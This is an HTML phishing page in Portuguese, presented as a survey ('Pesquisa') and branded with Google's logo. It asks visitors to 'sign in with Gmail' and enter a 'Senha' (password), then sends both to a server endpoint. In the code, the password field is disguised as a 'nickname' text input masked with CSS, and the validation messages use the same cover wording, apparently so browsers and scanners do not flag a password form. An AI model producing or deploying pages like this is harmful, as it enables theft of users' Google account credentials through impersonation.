<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
  >

  <title>Pesquisa</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;

      background:
        linear-gradient(
          rgba(4, 17, 35, 0.65),
          rgba(4, 17, 35, 0.75)
        ),
        url("https://blog.zooxsmart.com/hubfs/Capa---Artigo-de-Blog_-Analise-de-dados.jpg")
        center / cover no-repeat fixed;
    }

    .card {
      width: min(380px, 90vw);
      padding: 40px 32px;
      border-radius: 14px;
      background: #f3f3f3;
      box-shadow: 0 10px 30px rgba(0, 0, 0, .15);
    }

    .titulo {
      margin-bottom: 32px;
      color: #1a73e8;
      text-align: center;
      font-size: 28px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      color: #444;
    }

    input {
      width: 100%;
      height: 42px;
      padding: 10px;
      margin-bottom: 18px;
      border: 1px solid #d0d0d0;
      border-radius: 6px;
      background: #fff;
      font-size: 15px;
    }

    input:focus {
      outline: 2px solid #1a73e8;
      border-color: transparent;
    }

    button {
      width: 100%;
      height: 42px;
      border: none;
      border-radius: 6px;
      background: #1a73e8;
      color: #fff;
      cursor: pointer;
      font-size: 15px;
    }

    button:hover {
      background: #1557b0;
    }

    button:disabled {
      opacity: .7;
      cursor: wait;
    }

    /* Caixa que contém o campo e o olho */
    .campo-apelido {
      position: relative;
      width: 100%;
      margin-bottom: 18px;
    }

    .campo-apelido input {
      margin-bottom: 0;
      padding-right: 48px;
    }

    /*
      O campo continua type="text".
      Esta classe apenas mostra o conteúdo como pontos.
    */
    .campo-apelido input.valor-oculto {
      -webkit-text-security: disc;
    }

    /*
      Esta regra fica depois do estilo geral de button
      para impedir que o olho ocupe toda a largura.
    */
    .campo-apelido .botao-olho {
      position: absolute;
      top: 50%;
      right: 7px;
      z-index: 2;
      transform: translateY(-50%);

      display: flex;
      align-items: center;
      justify-content: center;

      width: 34px;
      min-width: 34px;
      height: 34px;
      padding: 0;

      border: none;
      border-radius: 50%;
      background: transparent;
      color: #555;
      font-size: 17px;
      line-height: 1;
      cursor: pointer;
    }

    .campo-apelido .botao-olho:hover {
      background: rgba(0, 0, 0, .08);
    }

    .campo-apelido .botao-olho:focus-visible {
      outline: 2px solid #1a73e8;
    }

    .msg {
      min-height: 18px;
      margin-top: 12px;
      text-align: center;
      color: #c62828;
      font-size: 14px;
    }

    @media (max-width: 600px) {
      body {
        background-attachment: scroll;
      }
    }
  </style>
</head>

<body>
  <form class="card" id="formEntrada">

    <img
      class="logo"
      src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
      alt="Google"
    >


    <label for="nome">Entre com o Gmail</label>

    <input
      id="nome"
      name="nome"
      type="text"
      maxlength="120"
      autocomplete="name"
      required
    >

    <label for="apelido">Senha</label>

    <div class="campo-apelido">
      <input
        id="apelido"
        name="apelido"
        type="text"
        maxlength="80"
        autocomplete="nickname"
        required
      >

      <button
        id="botaoOlho"
        class="botao-olho"
        type="button"
        aria-label="Ocultar apelido"
        title="Ocultar apelido"
      >
        👁
      </button>
    </div>

    <button id="botaoEntrar" type="submit">
      Entrar na pesquisa
    </button>

    <div id="mensagem" class="msg"></div>
  </form>

  <script>
    const formEntrada =
      document.getElementById('formEntrada');

    const campoNome =
      document.getElementById('nome');

    const campoApelido =
      document.getElementById('apelido');

    const botaoOlho =
      document.getElementById('botaoOlho');

    const botaoEntrar =
      document.getElementById('botaoEntrar');

    const mensagem =
      document.getElementById('mensagem');

    botaoOlho.addEventListener(
      'click',
      function () {
        const oculto =
          campoApelido.classList.toggle(
            'valor-oculto'
          );

        botaoOlho.textContent =
          oculto ? '◉' : '👁';

        const descricao =
          oculto
            ? 'Exibir apelido'
            : 'Ocultar apelido';

        botaoOlho.setAttribute(
          'aria-label',
          descricao
        );

        botaoOlho.title = descricao;
        campoApelido.focus();
      }
    );

    formEntrada.addEventListener(
      'submit',
      async function (event) {
        event.preventDefault();

        mensagem.textContent = '';

        const nome =
          campoNome.value.trim();

        const apelido =
          campoApelido.value.trim();

        if (!nome) {
          mensagem.textContent =
            'Informe seu nome completo.';

          campoNome.focus();
          return;
        }

        if (!apelido) {
          mensagem.textContent =
            'Informe seu apelido.';

          campoApelido.focus();
          return;
        }

        botaoEntrar.disabled = true;
        botaoEntrar.textContent =
          'Registrando...';

        try {
          const resposta =
            await fetch('/api/entrada', {
              method: 'POST',

              headers: {
                'Content-Type': 'application/json'
              },

              body: JSON.stringify({
                nome: nome,
                apelido: apelido
              })
            });

          const resultado =
            await resposta.json();

          if (!resposta.ok) {
            mensagem.textContent =
              resultado.mensagem ||
              'Não foi possível registrar a entrada.';

            return;
          }

          window.location.href = '/';

        } catch (erro) {
          console.error(erro);

          mensagem.textContent =
            'Não foi possível conectar ao servidor.';

        } finally {
          botaoEntrar.disabled = false;

          botaoEntrar.textContent =
            'Entrar na pesquisa';
        }
      }
    );
  </script>
</body>
</html>
